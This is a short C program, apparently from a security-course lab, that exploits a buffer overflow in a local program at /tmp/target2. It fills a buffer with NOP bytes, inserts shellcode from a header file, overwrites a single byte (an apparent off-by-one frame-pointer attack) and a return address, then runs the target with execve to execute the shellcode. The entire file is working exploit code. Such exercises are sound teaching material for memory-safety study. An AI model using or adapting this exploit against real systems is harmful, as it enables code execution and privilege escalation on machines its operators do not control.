#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char buffer[241];
  memset(buffer, 0x90, 241);
  char *args[3];
  char *env[1];
  int i;

for(i = 0; i < strlen(shellcode); i++) {
        buffer[191+i] = shellcode[i];
}
strncpy(buffer+240, "\x6c", 1);
strncpy(buffer+236, "\xfc\xfe\xff\xbf", 4);

  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

